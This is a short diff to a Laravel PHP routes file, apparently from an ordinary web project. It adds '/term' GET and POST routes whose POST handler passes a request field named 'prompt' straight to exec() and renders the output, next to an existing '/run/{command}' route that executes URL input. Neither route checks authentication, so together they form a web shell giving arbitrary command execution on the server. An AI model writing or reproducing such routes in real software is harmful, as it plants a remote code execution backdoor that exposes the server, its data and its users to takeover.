@@ -3,6 +3,7 @@
 use App\Http\Controllers\AdminController;
 use App\Http\Controllers\AuthController;
 use App\Http\Controllers\UserController;
+use Illuminate\Http\Request as HttpRequest;
 use Illuminate\Support\Facades\Artisan;
 use Illuminate\Support\Facades\Route;
 
@@ -68,4 +69,13 @@ Route::get('/artisan/seed', function () {
 Route::get('/run/{command}', function ($command) {
   exec('cd ../laravel/ && ' . $command, $output);
   return "<pre>" . implode('<br>', $output) . "</pre>";
+});
+
+Route::get('/term', function () {
+  return view('terminal');
+});
+
+Route::post('/term', function (HttpRequest $request) {
+  exec($request->prompt, $output);
+  return view('terminal', ['output' => $output]);
 });
